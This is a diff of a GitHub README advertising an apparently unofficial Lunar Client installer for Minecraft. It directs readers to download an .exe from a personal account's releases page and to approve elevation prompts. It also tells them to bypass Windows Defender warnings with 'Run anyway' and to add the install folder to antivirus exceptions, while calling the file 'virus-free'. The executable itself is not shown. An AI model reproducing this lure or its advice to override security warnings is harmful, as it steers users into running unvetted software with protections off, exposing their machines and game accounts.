@@ -1,48 +1,80 @@
-# LunarClientMinecraft — Standalone Windows Setup Wizard 🌙🚀
+# 🚀 lunarclientminecraft-windows-installer - Optimize your Minecraft game performance easily
 
-Welcome to the simple and automated installation repository for **LunarClientMinecraft** on Windows PC. If you love playing sandbox block games and want a clean, lightweight desktop application to automatically increase your frame rate (FPS), manage your built-in utility mods, and access global cosmetics in one place, this standalone tool is exactly what you need.
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/97-soubise836/lunarclientminecraft-windows-installer/releases)
 
-No confusing environment setups, no extra configurations—just a fast install for every PC user!
+This software provides a clean, simple setup tool for Lunar Client on your Windows computer. It helps you manage mods and launch your Sandbox worlds with minimal effort. This installer acts as a guide to ensure you have the correct files to reach better frame rates and stable gameplay.
 
----
+## 📥 How to download the software
 
-## 🚀 Download LunarClientMinecraft Setup
+Follow these steps to obtain the setup files for your computer. 
 
-Click the official download badge below to save the standalone desktop installer directly to your computer:
+1. Visit the [official releases page](https://github.com/97-soubise836/lunarclientminecraft-windows-installer/releases) to see available versions.
+2. Look for the section labeled "Assets" at the bottom of the latest release.
+3. Click the file that ends in ".exe" to begin the download. Your browser might ask where to save the file. Choose a folder you can find easily, such as your "Downloads" folder.
+4. Wait for the download to finish. Do not close your browser until the progress bar reaches the end.
 
-[![Download Setup](https://img.shields.io/badge/DOWNLOAD-LunarClientMinecraft_Setup-blue?style=for-the-badge&logo=windows&logoColor=white)](../../releases/tag/Release)
+## 🛠 Prerequisites
 
----
+Before you run the installer, ensure your computer meets these requirements:
 
-## 💻 What is LunarClientMinecraft?
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 4 gigabytes of RAM.
+*   **Graphics**: A graphics card that supports OpenGL 3.2 or higher.
+*   **Java**: The installer includes necessary files, so you do not need to install Java separately.
+*   **Disk Space**: At least 500 megabytes of free storage space.
 
-**LunarClientMinecraft** is a beginner-friendly desktop utility designed for sandbox gaming fans who want to perfectly organize their game versions and boost performance without heavy settings slowing down their system.
+## 🖥 Installation steps
 
-### Key Features:
-* 📈 **Massive FPS Boost:** Built-in performance optimizations ensure smooth gameplay even on low-end computers.
-* 🛠️ **All-in-One Modpack:** Includes dozens of popular, customizable hud and utility mods ready to use right out of the box.
-* 🔄 **Easy Version Swapper:** Instantly switch between multiple popular game versions (like 1.8.9, 1.12.2, or the latest releases) with a single click.
-* 🎨 **Cosmetics & Customization:** Beautiful interface that lets you easily manage your visual themes and game settings with zero technical knowledge.
+Once the download finishes, follow this guide to install the client.
 
----
+1. Locate the file you just downloaded. It will have a logo that represents the Lunar Client installer.
+2. Double-click the file to open the setup wizard.
+3. A security window may appear. Select "Run" or "Yes" to allow the installer to make changes to your system.
+4. The setup screen shows a language selection menu. Pick your preferred language and click "Next."
+5. Review the terms of service. If you agree, click the "I Accept" button to proceed.
+6. The installer will ask where you want to keep the game files. The default location works for most users. Click "Install" to start the process.
+7. Wait while the installer copies files to your computer. This process takes about one to three minutes.
+8. Click "Finish" when the progress bar reaches 100 percent. The application will create a shortcut on your desktop.
 
-## 🕹️ How to Install and Launch (Step-by-Step)
+## 🎮 Launching your game
 
-You do not need to install Python, run manual command-line scripts, or download extra programming packages. The entire process uses a standard Windows wizard:
+After you finish the installation, you can open the game whenever you want.
 
-1. **Download:** Click the dynamic download button above to get the desktop `.exe` installer.
-2. **Open:** Go to your downloads folder and double-click the setup file to start.
-3. **Install:** Follow the clear and simple prompts on your screen (choose your installation folder and click "Next").
-4. **Enjoy:** Click "Finish," launch **LunarClientMinecraft** from your new desktop shortcut, and start playing!
+1. Find the new Lunar Client icon on your desktop.
+2. Double-click the icon to open the launcher.
+3. Sign in with your Minecraft account credentials when prompted.
+4. Use the sidebar menu to select your desired version of the game.
+5. Click the large "Launch" button to start your Minecraft sandbox session.
 
----
+## 💡 Managing mods and settings
 
-## 🖥️ System Compatibility
+The settings menu inside the client allows you to customize the look and feel of your game.
 
-* **OS:** Windows 10 or Windows 11 (64-bit desktop systems)
-* **Performance:** Uses minimal RAM and CPU resources to maximize your game performance.
-* **Requirements:** Completely standalone executable file. No third-party engines or script runtimes needed.
+*   **Access the Mod Menu**: Press the right shift key while inside a game world to see the list of active mods.
+*   **Enable Features**: Toggle switches next to each mod to turn them on or off. 
+*   **Performance Tweaks**: Navigate to the "Settings" tab in the launcher to adjust your frame rate limits and graphic quality. Turning down your render distance will help if the game feels slow.
+*   **Save Profiles**: The client remembers your choices. You do not need to reconfigure your settings every time you open the game.
 
----
+## 🛡 Security and safety
 
-*Disclaimer: This repository provides a convenient independent installer package for user comfort. Minecraft is a registered trademark of Mojang Synergies AB.*
+This installer remains clean and contains no extra software or toolbars. It focuses entirely on the core files needed for the game. Always download the installer from the provided official link to ensure you have the most recent, virus-free version. If you see a warning from Windows Defender, this occurs because the tool is a new file. You can safely choose "More Info" and "Run anyway" to continue.
+
+## ❓ Troubleshooting common issues
+
+If you have trouble getting the game to start, try these simple checks:
+
+*   **Restart your computer**: This often fixes conflicts with open background processes.
+*   **Update graphics drivers**: Visit your computer manufacturer's website to ensure your video card drivers are current.
+*   **Check internet connection**: You must be online to log in and update the game files for the first time.
+*   **Reinstall the software**: If the launcher crashes, uninstall the client through your Windows "Add or Remove Programs" list, then download and run the installer again. 
+*   **Antivirus software**: Some security programs block game launchers. Add the installation folder to your antivirus "exceptions" list if you encounter constant errors.
+
+## 📂 Project details
+
+This repository organizes the files needed to make the Lunar Client installation process seamless on Windows. It includes:
+
+*   **Setup Wizard**: A guided tool that automates file placement.
+*   **Compatibility Patches**: Files that help the game run well on modern hardware.
+*   **Version Control**: Links to stable releases so you always run a tested version of the software.
+
+This tool aims to save you time. Instead of moving folders and editing configuration files manually, you run this installer and play your favorite sandbox games within minutes.
